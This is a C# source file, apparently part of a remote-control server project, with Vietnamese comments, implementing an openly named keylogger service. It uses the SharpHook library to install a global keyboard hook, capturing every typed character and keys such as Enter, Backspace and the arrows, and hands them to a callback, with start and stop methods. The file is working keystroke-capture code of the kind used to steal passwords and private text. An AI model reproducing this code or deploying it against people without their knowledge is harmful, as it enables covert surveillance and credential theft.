using System;
using System.Threading.Tasks;
using SharpHook;
using SharpHook.Native;

namespace Server.Services
{
    public class InputService : IDisposable
    {
        private TaskPoolGlobalHook _hook;
        private bool _isRunning = false;
        private Action<string> _onKeyDataReceived;

        public InputService()
        {
            _hook = new TaskPoolGlobalHook();

            // <--- [QUAN TRỌNG] Phải dùng cả 2 sự kiện này mới đủ
            // 1. KeyTyped: Bắt chữ cái chuẩn (A, a, !, @, Tiếng Việt...) -> Fix lỗi ASCII
            _hook.KeyTyped += OnKeyTyped;
            
            // 2. KeyPressed: Bắt phím chức năng (Enter, Backspace, F1...)
            _hook.KeyPressed += OnKeyPressed;
        }

        public void StartKeyLogger(Action<string> callback)
        {
            if (_isRunning) return;

            _onKeyDataReceived = callback;
            _isRunning = true;

            // Dùng RunAsync của thư viện thay vì Task.Run thủ công (ổn định hơn)
            _hook.RunAsync();
            Console.WriteLine("Keylogger started.");
        }

        public void StopKeyLogger()
        {
            if (!_isRunning) return;

            _isRunning = false;
            _onKeyDataReceived = null;
            
            // Dispose hook cũ để dừng hẳn tiến trình lắng nghe
            _hook.Dispose();
            Console.WriteLine("Keylogger stopped.");

            // Khởi tạo lại hook mới cho lần Start sau
            _hook = new TaskPoolGlobalHook();
            _hook.KeyTyped += OnKeyTyped;
            _hook.KeyPressed += OnKeyPressed;
        }

        // --- XỬ LÝ 1: VĂN BẢN (Fix lỗi Shift+1 ra 1) ---
        private void OnKeyTyped(object sender, KeyboardHookEventArgs e)
        {
            if (!_isRunning || _onKeyDataReceived == null) return;

            var charCode = e.Data.KeyChar;

            // Chỉ lấy ký tự văn bản, bỏ qua các ký tự điều khiển (trừ khi cần thiết)
            if (!char.IsControl(charCode))
            {
                _onKeyDataReceived?.Invoke(charCode.ToString());
            }
        }

        // --- XỬ LÝ 2: PHÍM CHỨC NĂNG ---
        private void OnKeyPressed(object sender, KeyboardHookEventArgs e)
        {
            if (!_isRunning || _onKeyDataReceived == null) return;

            // Chỉ xử lý các phím đặc biệt, các phím chữ đã có OnKeyTyped lo
            string keyData = FormatSpecialKey(e.Data);
            
            if (keyData != null)
            {
                _onKeyDataReceived?.Invoke(keyData);
            }
        }

        private string FormatSpecialKey(KeyboardEventData data)
        {
            switch (data.KeyCode)
            {
                case KeyCode.VcEnter: return "\n"; 
                case KeyCode.VcSpace: return " "; // Space bắt ở đây để chắc chắn
                case KeyCode.VcBackspace: return "[BACK]";
                case KeyCode.VcTab: return "[TAB]";
                case KeyCode.VcEscape: return "[ESC]";
                
                // Các phím mũi tên
                case KeyCode.VcUp: return "[UP]";
                case KeyCode.VcDown: return "[DOWN]";
                case KeyCode.VcLeft: return "[LEFT]";
                case KeyCode.VcRight: return "[RIGHT]";

                // Các phím F
                case KeyCode.VcF1: return "[F1]";
                // ... (Thêm F2-F12 nếu cần)

                // Mặc định trả về null để không in trùng lặp với OnKeyTyped
                default: return null;
            }
        }

        public void Dispose()
        {
            _hook?.Dispose();
        }
    }
}